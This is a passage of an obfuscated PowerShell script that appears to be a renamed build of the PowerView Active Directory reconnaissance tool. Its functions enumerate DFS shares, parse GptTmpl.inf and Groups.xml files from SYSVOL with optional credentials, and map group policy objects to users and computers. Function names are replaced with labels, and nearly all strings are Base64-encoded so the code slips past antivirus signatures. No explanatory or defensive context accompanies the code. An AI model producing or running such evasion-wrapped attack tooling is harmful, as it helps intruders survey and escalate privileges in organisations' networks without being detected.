                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${271} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
    }
    PROCESS {
        ${271} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                    ${271} += f107 @48
                }
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                    ${271} += f106 @48
                }
            }
        }
        else {
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                ${271} += f107 @48
            }
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                ${271} += f106 @48
            }
        }
        ${271} | sort -Property ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))) -Unique
    }
}
function f96 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        ${215},
        [Switch]
        ${f17},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${265} = @{}
    }
    PROCESS {
        try {
            if ((${215} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${268} = "\\$((New-Object System.Uri(${215})).Host)\SYSVOL"
                if (-not ${265}[${268}]) {
                    f93 -Path ${268} -Credential $Credential
                    ${265}[${268}] = $True
                }
            }
            ${269} = ${215}
            if (-not ${269}.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBpAG4AZgA='))))) {
                ${269} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAFAAYQByAHMAaQBuAGcAIABHAHAAdABUAG0AcABsAFAAYQB0AGgAOgAgACQAewAyADYAOQB9AA==')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                ${270} = f105 -Path ${269} -f17 -ErrorAction Stop
                if (${270}) {
                    ${270} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${269}
                    ${270}
                }
            }
            else {
                ${270} = f105 -Path ${269} -ErrorAction Stop
                if (${270}) {
                    ${270}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${269}
                    ${270}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIAAkAHsAMgA2ADkAfQAgADoAIAAkAF8A')))
        }
    }
    END {
        ${265}.Keys | % { f91 -Path $_ }
    }
}
function f103 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${265} = @{}
    }
    PROCESS {
        try {
            if (($GroupsXMLPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${268} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not ${265}[${268}]) {
                    f93 -Path ${268} -Credential $Credential
                    ${265}[${268}] = $True
                }
            }
            [XML]${267} = gc -Path $GroupsXMLPath -ErrorAction Stop
            ${267} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | select -ExpandProperty node | % {
                ${45} = $_.Properties.groupName
                ${242} = $_.Properties.groupSid
                if (-not ${242}) {
                    if (${45} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                        ${242} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
                    elseif (${45} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                        ${242} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
                    elseif (${45} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                        ${242} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${242} = f102 -460 ${45} -Credential $Credential
                        }
                        else {
                            ${242} = f102 -460 ${45}
                        }
                    }
                }
                ${210} = $_.Properties.members | select -ExpandProperty Member | ? { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | % {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if (${210}) {
                    if ($_.filters) {
                        ${233} = $_.filters.GetEnumerator() | % {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        ${233} = $Null
                    }
                    if (${210} -isnot [System.Array]) { ${210} = @(${210}) }
                    ${266} = New-Object PSObject
                    ${266} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $TargetGroupsXMLPath
                    ${266} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) ${233}
                    ${266} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${45}
                    ${266} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${242}
                    ${266} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Null
                    ${266} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${210}
                    ${266}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAAcwBYAE0ATAA='))))
                    ${266}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcgBvAHUAcABzAFgATQBMAF0AIABFAHIAcgBvAHIAIABwAGEAcgBzAGkAbgBnACAAJABUAGEAcgBnAGUAdABHAHIAbwB1AHAAcwBYAE0ATABQAGEAdABoACAAOgAgACQAXwA=')))
        }
    }
    END {
        ${265}.Keys | % { f91 -Path $_ }
    }
}
function f97 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f15},
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${247} = f74 @48
    }
    PROCESS {
        if (${247}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) {
                ${255} = @()
                if (${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${256} = ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
                ${259} = $Null
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
                    ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${f15}
                    ${116} = f79 @48 -FindOne | select -First 1
                    if(-not ${116}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABDAG8AbQBwAHUAdABlAHIAIAAnACQAewBmADEANQB9ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
                    }
                    ${258} = ${116}.distinguishedname
                    ${259} = ${116}.dnshostname
                }
                else {
                    ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity
                    ${f10} = f71 @48 -FindOne | select -First 1
                    if(-not ${f10}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAZQByACAAJwAkAFUAcwBlAHIASQBkAGUAbgB0AGkAdAB5ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
                    }
                    ${258} = ${f10}.distinguishedname
                }
                ${264} = @()
                ${264} += ${258}.split(',') | % {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        ${258}.SubString(${258}.IndexOf("$($_),"))
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABvAGIAagBlAGMAdAAgAE8AVQBzADoAIAAkAHsAMgA2ADQAfQA=')))
                if (${264}) {
                    ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                    ${260} = $False
                    ForEach(${263} in ${264}) {
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${263}
                        ${255} += f101 @48 | % {
                            if ($_.gplink) {
                                $_.gplink.split('][') | % {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        ${262} = $_.split(';')
                                        ${250} = ${262}[0]
                                        ${261} = ${262}[1]
                                        if (${260}) {
                                            if (${261} -eq 2) {
                                                ${250}
                                            }
                                        }
                                        else {
                                            ${250}
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                ${260} = $True
                            }
                        }
                    }
                }
                if (${259}) {
                    ${185} = (f95 -94 ${259}).SiteName
                    if(${185} -and (${185} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${185}
                        ${255} += f100 @48 | % {
                            if($_.gplink) {
                                $_.gplink.split('][') | % {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                ${257} = ${258}.SubString(${258}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))
                ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABjAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJAB7ADIANQA3AH0AKQA=')))
                ${255} += f98 @48 | % {
                    if($_.gplink) {
                        $_.gplink.split('][') | % {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABHAFAATwBBAGQAcwBQAGEAdABoAHMAOgAgACQAewAyADUANQB9AA==')))
                if (${256}) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${256} }
                else { ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))) }
                ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${255} | ? {$_ -and ($_ -ne '')} | % {
                    ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $_
                    ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAUABvAGwAaQBjAHkAQwBvAG4AdABhAGkAbgBlAHIAKQA=')))
                    f98 @48 | % {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                        }
                        $_
                    }
                }
            }
            else {
                ${251} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwB8AF4AQwBOAD0ALgAqAA==')))) {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAMgA1ADQAfQAnACAAZgByAG8AbQAgACcAJAB7ADIANQAyAH0AJwA=')))
                            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                            ${247} = f74 @48
                            if (-not ${247}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAyADUANAB9ACcA')))
                            }
                        }
                    }
                    elseif (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAuACoAfQA=')))) {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQA=')))
                    }
                    else {
                        try {
                            ${253} = (-Join (([Guid]${252}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                            ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                        }
                        catch {
                            ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                        }
                    }
                }
                if (${251} -and (${251}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${247}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGPO] filter string: $(${247}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${247}.FindOne() }
                else { ${72} = ${247}.FindAll() }
                ${72} | ? {$_} | % {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${28} = $_
                        ${28}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] -and ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
                            ${28} = f104 -Properties $_.Properties
                            try {
                                ${250} = ${28}.distinguishedname
                                ${249} = ${250}.SubString(${250}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                ${248} = "\\${249}\SysVol\${249}\Policies\$(${28}.cn)"
                                ${28} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGMAZgBpAGwAZQBzAHkAcwBwAGEAdABoAA=='))) ${248}
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $(${28}.distinguishedname)"
                            }
                        }
                        else {
                            ${28} = f104 -Properties $_.Properties
                        }
                        ${28}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                    }
                    ${28}
                }
                if (${72}) {
                    try { ${72}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                    }
                }
                ${247}.dispose()
            }
        }
    }
}
function f99 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
